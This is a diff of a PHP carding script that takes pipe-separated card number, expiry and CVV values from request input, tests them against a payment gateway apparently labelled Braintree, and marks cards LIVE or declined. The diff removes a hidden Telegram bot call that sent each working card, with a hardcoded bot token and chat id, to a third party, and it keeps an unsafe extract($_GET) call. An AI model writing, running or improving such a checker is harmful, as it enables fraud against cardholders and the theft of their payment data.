@@ -2,13 +2,6 @@
     error_reporting(0);
     $time_start = microtime(true);
 
-    if($_SERVER['REQUEST_METHOD'] == 'POST'){
-        extract($_POST);
-    }
-    else {
-        extract($_GET);
-    }
-
     function GetStr($string, $start, $end){
         $str = explode($start, $string);
         $str = explode($end, $str[1]);
@@ -26,6 +19,7 @@
         return $randomString;
     }
 
+    extract($_GET);
     $separator = explode("|", $lista);
     $cc = $separator[0];
     $mm = $separator[1];
@@ -37,16 +31,13 @@
     $username = RandomString().mt_rand(1, 999);
 
     $cbin = substr($cc, 0,1);
-    if($cbin == 5){
+    if($cbin == 5) {
         $cbin = 'master-card';
-    }
-    else if($cbin == 4){
+    } else if($cbin == 4) {
         $cbin = 'visa';
-    }
-    else if($cbin == 3){
+    } else if($cbin == 3) {
         $cbin = 'amex';
-    }
-    else {
+    } else {
         $cbin = 'null';
     }
 
@@ -155,15 +146,10 @@
     $message = GetStr($execute, '"message": "', '"');
     $confirmation = GetStr($execute, '"state": "', '"');
 
-    if(strpos($execute, 'succeeded')){
-
-        $data = "Card%3A%20$lista%0AStatus%3A%20%23LIVE%0AMessage%3A%20Authorized%0AGate%3A%20Braintree%201%0ABot%20By%3A%20%40Raizo666";
-        file_get_contents('https://api.telegram.org/bot1445766483:AAGZQdjCZpkj0t4c5AECjObd1hOom0TGBeA/sendMessage?chat_id=1485192243&text='.$data.'');
-
+    if(strpos($execute, 'succeeded')) {
         echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Response: '.$confirmation.'</span></td></tr><br>';
     }
     else {
-
         echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$dcode.' '.$message.'</span></td></tr><br>';
     }
     unlink("$username.txt");
